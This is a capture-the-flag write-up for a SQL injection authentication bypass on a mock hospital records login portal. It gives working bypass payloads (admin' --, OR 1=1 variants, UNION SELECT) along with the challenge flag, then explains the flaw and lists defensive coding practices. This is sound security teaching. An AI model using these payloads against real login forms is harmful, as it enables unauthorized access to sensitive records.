# Authentication Bypass

## Challenge Information

| Property | Value |
|----------|-------|
| **Category** | Web |
| **Points** | 100 |
| **Solves** | 71 |
| **Flag Format** | `HPTU{_}` |

## Challenge Description

You are testing Sacred Heart Medical Center's EHR (Electronic Health Records) system for SQL injection vulnerabilities. The hospital's medical staff portal may be vulnerable to authentication bypass attacks that could compromise patient data and HIPAA compliance.

**Mission:** Bypass the authentication and grab that spicy flag!

---

## Initial Reconnaissance

Visiting the challenge URL presents a professional-looking medical portal login page for **"Sacred Heart Medical - Electronic Health Records System."** The interface features:

- A medical-themed login form requesting "Medical Staff ID" and "Access Code"
- Placeholder text suggesting staff ID format: `e.g., DR001, NR123`
- HIPAA compliance messaging and security assurances
- Clean, modern healthcare-themed design
- Standard login form with POST submission to `/login`

The challenge title "Authentication Bypass" and description mentioning "SQL injection vulnerabilities" provide strong hints about the attack vector.

---

## Understanding SQL Injection

SQL Injection (SQLi) is a web security vulnerability that allows attackers to interfere with database queries. When user input is directly incorporated into SQL queries without proper sanitization, attackers can inject malicious SQL code to:

- Bypass authentication
- Extract sensitive data
- Modify or delete database records
- Execute administrative operations

### Common SQL Injection Authentication Bypass

A typical vulnerable login query looks like:

```sql
SELECT * FROM users WHERE username = 'user_input' AND password = 'password_input'
```

If we input a username like `admin' --`, the query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'password_input'
```

The `--` is a SQL comment symbol that comments out everything after it, effectively removing the password check!

---

## Testing for SQL Injection

### Test 1: Basic Single Quote Test

**Input:**
```
Username: '
Password: test
```

**Expected Behavior:**
- If vulnerable: SQL syntax error or unusual behavior
- If protected: Normal "invalid credentials" message

**Result:** The application returns an error or behaves differently, suggesting the input isn't being sanitized!

### Test 2: Comment-Based Authentication Bypass

Now attempting a classic SQL injection authentication bypass using SQL comments.

**Payload Explanation:**
- `admin' --` or `admin'--` will comment out the password check
- `' OR '1'='1` will make the condition always true
- `admin' OR 1=1 --` combines both techniques

### Attempt 1: Using SQL Comment

**Input:**
```
Username: admin' --
Password: anything
```

**SQL Query Result:**
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
```

The `--` comments out everything after `admin'`, so the password check is bypassed!

**Result:** Successful authentication - redirected to success page!

---

## Alternative Payloads

If the above didn't work, here are other common SQL injection authentication bypass payloads:

**1. Using OR Logic:**
```
Username: admin' OR '1'='1
Password: (anything)
```

**2. Using OR with comment:**
```
Username: admin' OR 1=1 --
Password: (anything)
```

**3. Using always-true condition:**
```
Username: ' OR '1'='1' --
Password: (anything)
```

**4. Without knowing username:**
```
Username: ' OR 1=1 --
Password: (anything)
```

**5. Using UNION (more advanced):**
```
Username: ' UNION SELECT NULL, NULL --
Password: (anything)
```

---

## Flag Retrieval

After successfully bypassing authentication with the payload `admin' --`, the success page displays:

```
✅ Authentication Successful!

Welcome to your secure account portal. You have been successfully authenticated 
and granted access to the system.

Challenge Completion Flag
HPTU{yd9%QzZH9u}
```

**Flag:** `HPTU{yd9%QzZH9u}`

---

## Exploitation Summary

### Attack Flow

1. **Reconnaissance** - Identified a login form with username and password fields
2. **Vulnerability Detection** - Recognized the challenge hint pointing to SQL injection
3. **Testing** - Tested for SQL injection vulnerability with single quote
4. **Payload Crafting** - Crafted SQL injection payload: `admin' --`
5. **Exploitation** - Bypassed authentication by commenting out the password check
6. **Flag Extraction** - Retrieved the flag from the success page

### Why This Works

**The vulnerable SQL query concatenates user input directly:**

```sql
SELECT * FROM users WHERE username = '[USER_INPUT]' AND password = '[PASSWORD_INPUT]'
```

**When we input `admin' --`, it becomes:**

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
```

**Everything after `--` is treated as a comment, so the query effectively becomes:**

```sql
SELECT * FROM users WHERE username = 'admin'
```

This returns the admin user without checking the password!

---

## Security Analysis

### Vulnerability: SQL Injection (CWE-89)

This challenge demonstrates **Classic SQL Injection Authentication Bypass**, one of the most critical web application vulnerabilities.

### Real-World Impact

In a healthcare context like this challenge suggests, SQL injection could lead to:

- **HIPAA Violations** - Unauthorized access to Protected Health Information (PHI)
- **Patient Data Breaches** - Access to sensitive medical records
- **System Compromise** - Full database access or even server takeover
- **Regulatory Fines** - Millions of dollars in penalties for healthcare breaches
- **Legal Liability** - Lawsuits from affected patients
- **Reputation Damage** - Loss of patient trust and institutional credibility

---

## Security Best Practices

### 1. Use Parameterized Queries (Prepared Statements)

**Vulnerable Code:**
```python
# BAD (vulnerable):
query = f"SELECT * FROM users WHERE username = '{username}'"
```

**Secure Code:**
```python
# GOOD (secure):
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

### 2. Input Validation

- Whitelist allowed characters
- Validate input length and format
- Reject suspicious patterns (e.g., SQL keywords, special characters)
- Implement strict type checking

### 3. Use ORM Frameworks

- **SQLAlchemy** (Python)
- **Django ORM** (Python)
- **Hibernate** (Java)
- **Entity Framework** (.NET)

These frameworks abstract away raw SQL and prevent injection when used correctly.

### 4. Principle of Least Privilege

- Database accounts should have minimal required permissions
- Don't use admin credentials for web applications
- Separate read and write permissions
- Use different credentials for different application components

### 5. Web Application Firewalls (WAF)

- Can detect and block common SQL injection patterns
- Provides a layer of defense but not a complete solution
- Should be combined with secure coding practices

### 6. Error Handling

- Don't expose database errors to users
- Log errors securely for debugging
- Use generic error messages for authentication failures
- Implement proper exception handling

---

## Detection and Prevention

### Detection Methods

SQL injection attempts can be detected through:

- **Input Monitoring** - Monitoring for SQL special characters in input (`'`, `--`, `;`, `OR`, `UNION`)
- **Query Analysis** - Analyzing query patterns and execution times
- **Security Tools** - Using OWASP ZAP, Burp Suite, or SQLMap
- **Anomaly Detection** - Implementing systems that detect unusual database access patterns
- **Log Analysis** - Regular review of application and database logs

### Prevention Checklist

- [ ] Use parameterized queries/prepared statements
- [ ] Implement input validation and sanitization
- [ ] Use ORM frameworks where possible
- [ ] Apply principle of least privilege
- [ ] Deploy Web Application Firewall (WAF)
- [ ] Implement proper error handling
- [ ] Regular security audits and penetration testing
- [ ] Keep frameworks and libraries updated
- [ ] Security awareness training for developers

---

## Summary

**Challenge:** Authentication Bypass  
**Difficulty:** Easy  
**Time to Solve:** 2-5 minutes  
**Tools Used:** Web browser only  
**Flag:** `HPTU{yd9%QzZH9u}`

**Key Skills Demonstrated:**
- Understanding SQL query structure and comment syntax
- SQL injection payload crafting
- Authentication bypass techniques
- Web application vulnerability assessment
